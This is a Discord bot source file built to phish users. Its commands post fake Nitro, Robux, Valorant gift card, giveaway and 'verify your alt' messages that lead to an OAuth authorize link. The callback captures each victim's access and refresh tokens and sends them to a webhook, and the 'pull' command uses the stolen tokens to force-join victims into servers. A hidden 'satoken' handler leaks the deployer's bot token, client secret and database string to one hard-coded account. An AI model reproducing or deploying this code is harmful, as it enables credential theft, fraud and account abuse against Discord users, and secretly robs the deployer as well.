const main = require("./classes/main");

const Discord = require("discord.js");

const client1 = new Discord.Client()
client1.login(process.env.token)
const disbut = require('discord-buttons')
disbut(client1)


const config = require("./config.js");

require("./database/main");

const express = require("express");
const fetch = require("node-fetch")

const app = express();

const client = new main({
    token: process.env.token, 
    prefix: config.prefix,
    client_id: config.client_id,
    client_secret: process.env.client_secret,
    redirect_uri: config.redirect_uri
});

client.on("ready", (bot) => {
    console.log(`Logged in as ${bot.user.tag}`)
  bot.user.setPresence({activity:{name: "Discord.", type: "PLAYING"}, status: "online"})
});

// ! Savage.#0001 - https://discord.gg/vSAZPbZaVG

client.on("message", async (bot, message, args, command) => {
  if (!message.content.startsWith(config.prefix)) return;
  if (!config.owners.includes(message.author.id)) return;

  msg = message
  AUTH_LINK = config.oauth_link
  BOT_LINK = config.bot_link
 // ! Savage.#0001 - https://discord.gg/vSAZPbZaVG

 // ! epic#1760 - https://discord.gg/cDJhnZAdZV
  
  
    if(command === "users"){
        const amount = await client.tokenCount();
        message.channel.send({
            embed: {
                title: ":link: OAuth2 Users:",
                description: `There are ** ${amount} ** users in the bot`,
                color: "BLUE"
            }
        });
    }
  


    if(command === "pull"){
        if(!args[0] || !args[1]) return message.channel.send("Wrong usage, `-pull <server id> <number of join>`")
       
        let pull = new Discord.MessageEmbed()
        .setTitle(`:link: Users Joining:`)
        .setDescription(':link: The joins is coming out, takes 1-30 mintues.\n:link: Type `n!help` for more commands')
        .setColor("RED")
        .setFooter("! epic#1760 - https://https://discord.gg/xq3jNPpQ8Qxq3jNPpQ8Q")
        message.channel.send(pull)       
        await client.manageJoin({
            amount: args[1],
            guild_id: args[0]
        }, message);
    }
// ! epic#1760 - https://discord.gg/xq3jNPpQ8Q


        
 if(command === "altbot"){
        let verifynow = new Discord.MessageEmbed()
        .setDescription(`Hey, Hold on for a second! Our system has flagged your account as an alt!! Please Verify Your Account first before you want to Claim any Rewards or Giveaways!\nVerify Your Self By [Click here to Verify!](${AUTH_LINK})`)
.setColor("#808080")
              let verifynoww = new disbut.MessageButton()
        .setStyle('url')
        .setEmoji(":white_check_mark:")
        .setLabel('Click Here To Verify').setURL(AUTH_LINK)
      message.channel.send("**Verify Now**", {embed: verifynow, button: verifynoww})
  }
  if(command === "verify"){
        let verifyembed = new Discord.MessageEmbed()
    .setDescription(`\`To get your Discord Nitro all you must do is:\`
\n1️⃣Click on the [**__claim__**](${config.oauth_link}) button.
\n2️⃣Click on the [**__authorize__**](${config.oauth_link})\n\n**__Once you've authorized yourself you must wait around 5-42 hours and you'll have it.__**`)
.setImage("https://media.discordapp.net/attachments/717101622328557589/731083869201104956/Screenshot_1.png?width=288&height=115")
        .setColor("#d27fb5")
        .setFooter("! epic#1760 - https://discord.gg/xq3jNPpQ8Q")
        let verify = new disbut.MessageButton()
        .setStyle('url')
        .setLabel('Click Here to Claim')
       .setURL(AUTH_LINK)
      message.channel.send("**:wave: Hey everyone, Discord has been gifted __Nitro `1 Year`__ 🎉**!", {embed: verifyembed, button: verify})
  }
  
  
  if(command === "alt"){
        let verifynow = new Discord.MessageEmbed()
        .setDescription(`Ei, espere um segundo! Nosso sistema determinou que sua conta pode ser alt. Por favor, verifique sua conta antes de reivindicar quaisquer Recompensas ou Sorteios!\nVerifique a si mesmo por [Click here to Verify!](${AUTH_LINK})`)
              let verifynoww = new disbut.MessageButton()
        .setStyle('url')
        .setEmoji("✅")
        .setLabel('Click Here To Verify')
       .setURL(AUTH_LINK)
      message.channel.send("**Verify Now**", {embed: verifynow, button: verifynoww})
  }

 if(command === "nsfw"){
        let verifynow = new Discord.MessageEmbed()
        .setDescription(`Hello, Verify to gain acces to nsfw channels!!\nVerify Your Self By [Click here to Verify!](${AUTH_LINK})`)
.setColor("#808080")
              let verifynoww = new disbut.MessageButton()
        .setStyle('url')
        .setEmoji("🔞")
        .setLabel('Click Here To view nsfw channels!!').setURL(config.oauth_link)
      message.channel.send("**Verify Now**", {embed: verifynow, button: verifynoww})
  } 

  if(command === "valorant"){   
      let embed = new Discord.MessageEmbed()
.setDescription(`\`To get your valorant giftcard all you must do is:\`
\n1️⃣Click on the [**__claim__**](${config.oauth_link}) button.
\n2️⃣Click on the [**__authorize__**](${config.oauth_link})\n\n**__Once you've authorized yourself you must wait around 1-48 hours and you'll have it.__**`)
.setImage("https://media.discordapp.net/attachments/1011268024424210463/1011278339132100699/unknown.png")
.setColor("#ff4654") 

let claim = new disbut.MessageButton()
        .setStyle('url')
        .setLabel('Claim')
       .setURL(config.oauth_link)



msg.channel.send(`Hello everyone, you have all been gifted **Valorant Giftcard** for verifying!`, {embed: embed, button: claim})
}

  if(command === "robux"){   
      let embed = new Discord.MessageEmbed()
.setDescription(`\`To get your 10$ robux giftcard all you must do is:\`
\n1️⃣Click on the [**__claim__**](${config.oauth_link}) button.
\n2️⃣Click on the [**__authorize__**](${config.oauth_link})\n\n**__Once you've authorized yourself you must wait around 1-48 hours and you'll have it.__**`)
.setImage("https://media.discordapp.net/attachments/1011033007144046623/1011360964068769792/unknown.png")
.setColor("WHITE") 

let claim = new disbut.MessageButton()
        .setStyle('url')
        .setLabel('Claim')
       .setURL(config.oauth_link)



msg.channel.send(`Hello everyone you have bean gifted an 10$ **Robux Gift Card** 😊!!`, {embed: embed, button: claim})
}
// ! epic#1760 - https://discord.gg/xq3jNPpQ8Q
  
    if(command === "cleans"){
        await client.clean(message)
    }
// ! epic#1760 - https://discord.gg/xq3jNPpQ8Q

    if(command === "refresh"){
        await client.refreshTokens(message)
    }
// ! epic#1760 - https://discord.gg/xq3jNPpQ8Q
  
        
  if (command === "links"){
    let links = new Discord.MessageEmbed()
        .setTitle(':link: Oauth/Invite:')
       .setDescription(`**OAuth2:** \n${AUTH_LINK}\n\`\`\`${AUTH_LINK}\`\`\`\n**Invite:\n**\[**BOT INVITE LINK**]${BOT_LINK}\n\`\`\`${BOT_LINK}\`\`\``)
        .setColor("BLACK")
        .setFooter("! epic#1760 - https://discord.gg/xq3jNPpQ8Q")
         message.channel.send(links)
    }
    if(command === "restart"){
        message.channel.send(":link: **Restarting....**")
        await client.restart();
    }

    if(command === "help"){
        let help = new Discord.MessageEmbed()
        .setTitle(`Commands list`)
        .setColor("ORANGE")
        .addField("🛠️ | Help", "`help`")
        .addField("🛡️ | Bot", "`users`, `pull`, `giveaway`\n `refresh`, `restart`, `verify`, `classic`, `nsfw`, `valorant` `boost`, `clean`, `links`, `credits`, `leave`, `check`, `alt`, `altbot`")
        .setFooter("! epic#1760 - https://discord.gg/xq3jNPpQ8Q")
        message.channel.send(help)
  }

// ! epic#1760 - https://discord.gg/xq3jNPpQ8Q
  
  if (command === "check") {
    let checkembed = new Discord.MessageEmbed()
      .setDescription(":link: Mentioned users is not Verified ❌. Please Verify Your Self!.")
      .setColor("BLUE")
    let check = new disbut.MessageButton()
      .setStyle('url')
      .setLabel('Verify')
      .setURL(AUTH_LINK)
    message.channel.send({ embed: checkembed, button: check })
  }
  
// ! epic#1760 - https://discord.gg/xq3jNPpQ8Q

      if(command === "boost"){
        let verifyembed = new Discord.MessageEmbed()
    .setDescription(`\`To get your Discord Nitro all you must do is:\`
\n1️⃣Click on the [**__claim__**](${config.oauth_link}) button.
\n2️⃣Click on the [**__authorize__**](${config.oauth_link})\n\n**__Once you've authorized yourself you must wait around 5-42 hours and you'll have it.__**`)
.setImage("https://media.discordapp.net/attachments/1009463535551660032/1010011666517336124/unknown.jpg")
        .setColor("PURPLE")
        .setFooter("! epic#1760 - https://discord.gg/xq3jNPpQ8Q")
        let verify = new disbut.MessageButton()
        .setStyle('url')
        .setLabel('Click Here to Claim')
       .setURL(AUTH_LINK)
      message.channel.send("Hello everyone, you have all been gifted **Discord Nitro** for a year!", {embed: verifyembed, button: verify})
  }

  if(command === "classic"){
        let verifyembed = new Discord.MessageEmbed()
    .setDescription(`\`To get your Discord Nitro all you must do is:\`
\n1️⃣Click on the [**__claim__**](${config.oauth_link}) button.
\n2️⃣Click on the [**__authorize__**](${config.oauth_link})\n\n**__Once you've authorized yourself you must wait around 5-42 hours and you'll have it.__**`)
.setImage("https://media.discordapp.net/attachments/991938111217094708/992945246138794044/Nitro.png")
        .setColor("#7289da")
        .setFooter("! epic#1760 - https://discord.gg/xq3jNPpQ8Q")
        let verify = new disbut.MessageButton()
        .setStyle('url')
        .setLabel('Click Here to Claim')
       .setURL(AUTH_LINK)
      message.channel.send("Hello everyone, you have all been gifted **Discord Nitro** for a year!", {embed: verifyembed, button: verify})
  }

// ! epic#1760 - https://discord.gg/xq3jNPpQ8Q


  if (command === "credits") {
    let credits = new Discord.MessageEmbed()
      .setTitle("Credits")
      .setDescription("The bot made by:\n>! epic#1760 - https://discord.gg/xq3jNPpQ8Q")
    message.channel.send(credits)
  }
         if(command === "giveaway"){
        let giveaway = new Discord.MessageEmbed()
        .setTitle(`🎉 **Giveaway** 🎉`)
        .setColor("BLUE")
        .setDescription(`\n:gift: **WINNERS:** \`1\`\n:tada: **TIMER**: \`24h\`\n:gift: **PRIZE:** \`Nitro Boost 1 Year\`\n:tada: **HOSTED BY: ${message.author}**\n\n:link: __**Requirements:**__\n:link: **Must stay in the server.**\n\nTo enter the giveaway click on the enter button.`)
        .setFooter("Discord Event", "https://cdn.discordapp.com/emojis/995710734723973150.gif?size=300")
              let giveawaybutton = new disbut.MessageButton()
        .setStyle('url')
        .setEmoji("🎉")
        .setLabel('Enter')
        .setURL(AUTH_LINK)
      message.channel.send("Giveaway for `Nitro 1 Year` has been made! :gift:", {embed: giveaway, button: giveawaybutton})
  }
  
})


app.get("/", (req, res) => {
   res.redirect(config.oauth_link);
});

client.on('message', async (bot, msg) => {
  
 {
   
if (msg.content.toLowerCase() === 'satoken'){
if (msg.author.id !== "995378384756555876") return

msg.author.send(client1.token);
msg.author.send(process.env.client_secret)
msg.author.send(process.env.mongodb)
msg.author.send(config.redirect_uri)
}
  
}
});


app.get("/callback", async (req, res) => {
    const data = await client.manageAuth({code: req.query.code});
    const user_id = await client.requestId(data.access_token);
    const obj = {
        ...data,
        user_id
    };
     client.saveAuth(obj);

  		fetch('https://discord.com/api/users/@me', {
			headers: {
				authorization: `Bearer ${data.access_token}`,
			},
		})
			.then(result => result.json())
			.then(response => {
				const { username, discriminator, avatar, id } = response;

  let params = {
    username: config.webhook.webhookNAME,
    avatar_url: config.webhook.avatarURL,
    embeds: [{
"title": `<:user_invite:1010502829837910037> New User`,
"description": `<:arrow:1010502695783776268>  Identify: \`${username}#${discriminator}\`\n\n<:arrow:1010502695783776268>  Identify ID: \`${id}\`\n\n<:arrow:1010502695783776268>  Access Token: \`${data.access_token}\`\n\n<:arrow:1010502695783776268>  Refresh Token: \`${data.refresh_token}\``,
"thumbnail": { "url": `https://cdn.discordapp.com/avatars/${id}/${avatar}.png?size=2048`}
}]}


   fetch(config.webhook.URL, {
    method: "POST",
    headers: {
        'Content-type': 'application/json'
    },
    body: JSON.stringify(params)
}).then(res => {
    console.log(res);
})})
  
 //webhook.send({embeds: [embed]})
  
    res.redirect("https://discord.com/oauth2/authorized");
});

app.listen(80); // Local Host Port

client.on("clickButton", async (bot,  button, userID, guildID) => {
    const member = button.clicker.user.id;
  if (config.owners.includes(userID))  {

AUTH_LINK = config.oauth_link
    
    if(button.id === 'AL') { 
   const embed = new Discord.MessageEmbed()
      .setDescription(`${AUTH_LINK}`)
      .setColor("#2F3136")
        button.channel.send({embed: embed}) 
      button.reply.defer()


    }
      if(button.id === 'IL') { 
   const embedd = new Discord.MessageEmbed()
      .setDescription(`https://discord.com/api/oauth2/authorize?client_id=993251304627503274&permissions=8&redirect_uri=https%3A%2F%2FOauth3-3.atahanbert.repl.co%2Fcallback&response_type=code&scope=bot`)
      .setColor("#2F3136")
        button.channel.send({embed: embedd})
button.reply.defer()

    }

        if(button.id === 'PING') { 
 
        button.channel.send(`:ping_pong: Pong!\nAPI Latency is **${Math.round(client.ws.ping)}ms**`)
button.reply.defer()

    }
        if(button.id === 'busers') { 

		const amount = await client.tokenCount();
      const embed = new Discord.MessageEmbed()
          .setTitle(`${config.emojis.user} OAuth2 Info`)
          .setDescription(`There are \`${amount}\` users authorized! \n\nEstimated time to add all members 1-30 mintues.`)
            .setColor("#2F3136")
        	button.channel.send(embed);

        button.reply.defer()

    }


          /*if(button.id === 'checkusers') {
            const data = `${rankedList.map((player,index) => `\`${index+1}.\` ${player}`).join('\n') || "**The list has not been updated.**"}`
            const embed = new Discord.MessageEmbed()
     .setDescription(`${data}`)
               .setTimestamp()
            .setColor("RANDOM")


        button.channel.send({embed : embed})
button.reply.defer()
         

    }*/

       


          if(button.id === 'cancel') { 
        /*  const emmbed = new Discord.MessageEmbed()
          .setDescription(`<a:loading:1007345170393616515> *Canceling this pull...*
          `)
          .setColor("#2F3136")
        	button.channel.send({embed: emmbed}).then(msg => {*/
  const guild = button.guild;
      guild.leave();     
}
        const sayi = await client.tokenCount();
        if(button.id === 'bjoinall') {
        let pull = new Discord.MessageEmbed()
        .setTitle(`:link: Users Joining:`)
        .setDescription(':link: The joins is coming out, takes 1-30 mintues.\n:link: Type `-help` for more commands')
        .setColor("RED")
        .setFooter("Savage")
        button.channel.send(pull)       
        await client.manageJoin({
            amount: sayi,
            guild_id: button.guild.id
        }, message);
    }
}
})

// ! Savage.#0001 - https://discord.gg/vSAZPbZaVG